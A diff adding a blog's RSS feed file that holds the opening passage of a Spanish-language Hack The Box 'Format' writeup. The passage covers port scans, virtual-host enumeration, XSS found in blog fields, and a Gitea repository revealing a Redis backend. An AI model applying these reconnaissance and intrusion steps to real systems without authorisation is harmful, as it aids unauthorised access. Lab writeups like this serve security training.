@@ -1,0 +1,756 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Bajo el Teclado</title>
+    <link>http://localhost:1313/tags/format/</link>
+    <description>Recent content on Bajo el Teclado</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <managingEditor>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</managingEditor>
+    <webMaster>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</webMaster>
+    <copyright>© 2024 pointedsec</copyright>
+    <lastBuildDate>Wed, 04 Sep 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/format/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Hack The Box: Format Writeup | Medium</title>
+      <link>http://localhost:1313/writeups/format---hackthebox/</link>
+      <pubDate>Wed, 04 Sep 2024 00:00:00 +0000</pubDate><author>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</author>
+      <guid>http://localhost:1313/writeups/format---hackthebox/</guid>
+      <description>&lt;h1 id=&#34;hack-the-box-format-writeup&#34;&gt;Hack The Box: Format Writeup&lt;/h1&gt;
+&lt;p&gt;Welcome to my detailed writeup of the medium difficulty machine &lt;strong&gt;&amp;ldquo;Format&amp;rdquo;&lt;/strong&gt; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.&lt;/p&gt;
+&lt;h1 id=&#34;tcp-enumeration&#34;&gt;TCP Enumeration&lt;/h1&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ rustscan -a 10.129.229.3 --ulimit &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;5000&lt;/span&gt; -g
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;2&lt;/span&gt;&lt;span&gt;10.129.229.3 -&amp;gt; [22,80,3000]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ nmap -p22,80,3000 -sCV 10.129.229.3 -oN allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 2&lt;/span&gt;&lt;span&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 19:10 CEST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 3&lt;/span&gt;&lt;span&gt;Nmap scan report for 10.129.229.3
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Host is up (0.037s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 5&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 6&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;&lt;/span&gt;PORT     STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 7&lt;/span&gt;&lt;span&gt;22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 8&lt;/span&gt;&lt;span&gt;| ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 9&lt;/span&gt;&lt;span&gt;|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;10&lt;/span&gt;&lt;span&gt;|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;11&lt;/span&gt;&lt;span&gt;|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;12&lt;/span&gt;&lt;span&gt;80/tcp   open  http    nginx 1.18.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;13&lt;/span&gt;&lt;span&gt;|_http-title: Site doesn&amp;#39;t have a title (text/html).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;14&lt;/span&gt;&lt;span&gt;|_http-server-header: nginx/1.18.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;15&lt;/span&gt;&lt;span&gt;3000/tcp open  http    nginx 1.18.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;16&lt;/span&gt;&lt;span&gt;|_http-title: Did not follow redirect to http://microblog.htb:3000/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;17&lt;/span&gt;&lt;span&gt;|_http-server-header: nginx/1.18.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;18&lt;/span&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;19&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;20&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;21&lt;/span&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1 id=&#34;udp-enumeration&#34;&gt;UDP Enumeration&lt;/h1&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ sudo nmap --top-ports &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1500&lt;/span&gt; -sU -n -Pn --min-rate &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;5000&lt;/span&gt; 10.129.229.3 -oN allPorts.UDP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 2&lt;/span&gt;&lt;span&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 19:11 CEST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 3&lt;/span&gt;&lt;span&gt;Nmap scan report for 10.129.229.3
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Host is up (0.037s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 5&lt;/span&gt;&lt;span&gt;Not shown: 1494 open|filtered udp ports (no-response)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 6&lt;/span&gt;&lt;span&gt;PORT      STATE  SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 7&lt;/span&gt;&lt;span&gt;1053/udp  closed remote-as
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 8&lt;/span&gt;&lt;span&gt;1434/udp  closed ms-sql-m
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 9&lt;/span&gt;&lt;span&gt;3389/udp  closed ms-wbt-server
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;10&lt;/span&gt;&lt;span&gt;17674/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;11&lt;/span&gt;&lt;span&gt;22417/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;12&lt;/span&gt;&lt;span&gt;25538/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;13&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;14&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;&lt;/span&gt;Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Del escaneo inicial encontramos el dominio &lt;code&gt;microblog.htb&lt;/code&gt;, lo añadimos al &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h1 id="hack-the-box-format-writeup">Hack The Box: Format Writeup</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Format&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.229.3 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.229.3 -&gt; [22,80,3000]
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p22,80,3000 -sCV 10.129.229.3 -oN allPorts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 19:10 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report for 10.129.229.3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.037s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#f00"></span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>80/tcp   open  http    nginx 1.18.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>3000/tcp open  http    nginx 1.18.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>|_http-title: Did not follow redirect to http://microblog.htb:3000/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span><span style="color:#f00"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
+</span></span></code></pre></div>
+<h1 id="udp-enumeration">UDP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU -n -Pn --min-rate <span style="color:#ff0;font-weight:bold">5000</span> 10.129.229.3 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 19:11 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report for 10.129.229.3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.037s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Not shown: 1494 open|filtered udp ports (no-response)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>1053/udp  closed remote-as
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>1434/udp  closed ms-sql-m
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>3389/udp  closed ms-wbt-server
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>17674/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>22417/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>25538/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span><span style="color:#f00"></span>Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
+</span></span></code></pre></div>
+<p>Del escaneo inicial encontramos el dominio <code>microblog.htb</code>, lo añadimos al <code>/etc/hosts</code></p>
+<p>No hay otros vectores de entrada, por lo cual la intrusión debe de acontecerse a través de alguno de los servicios web.</p>
+<h1 id="http-enumeration---80">HTTP Enumeration -&gt; 80</h1>
+<p>Vamos a empezar enumerando el puerto 80/TCP.</p>
+<p><code>whatweb</code> nos reporta que se acontece una redirección al subdominio <code>app.microblog.htb</code> si intentamos acceder al puerto 80/TCP utilizando la IP de  la máquina. Existen respuestas distintas por lo cual se está aconteciendo Virtual Hosting por detrás, puede significar que existen mas subdominios.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ whatweb http://10.129.229.3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>http://10.129.229.3 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.129.229.3], Meta-Refresh-Redirect[http://app.microblog.htb], nginx[1.18.0]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>ERROR Opening: http://app.microblog.htb - no address for app.microblog.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/format]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>└──╼ [★]$ ^C
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/format]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>└──╼ [★]$ whatweb http://microblog.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>http://microblog.htb [404 Not Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.129.229.3], Title[404 Not Found], nginx[1.18.0]
+</span></span></code></pre></div>
+<p>Así se ve el sitio web.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Encontramos un apartado donde se está reflejando como si se tuvieran varios subdominios por detrás, 15 para ser exactos.
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Después de fuzzear con <code>wfuzz</code> los 15 subdominios para el servicio web del puerto 80/TCP y 3000/TCP, no encontré nada interesante.</p>
+<p>Podemos crearnos una cuenta.
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<h2 id="multiple-xss">Multiple XSS</h2>
+<p>Parece que nos da la opción de crear un blog bajo un subdominio.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Podemos ver que se crean.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Podemos editar el texto.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Se acontece un XSS al insertar código Javascript en el h1.
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Ocurre otro XSS si lo insertamos en el texto.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>No podemos enviar nada a nadie por ahora, así que no podemos realizar un ataque de tipo Cookie Hijacking por ejemplo.</p>
+<p>La cookie que alberga la sesión es esta, parece que es el número de usuario encriptado o una especie de ID de usuario.
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<h1 id="http-enumeration---3000">HTTP Enumeration -&gt; 3000</h1>
+<p>En el puerto 3000 encontramos una instancia de Gitea, no podemos crearnos una cuenta.
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Encontramos un repositorio de un usuario llamado <code>cooper</code> que alberga el proyecto encontrado anteriormente
+<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
+<p>Analizando el código vemos que se está utilizando una base de datos <code>Redis</code> detrás.
+<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
+<p>Tenemos esta función <code>addSite($site_name)</code></p>
+
+
+
+
+
+
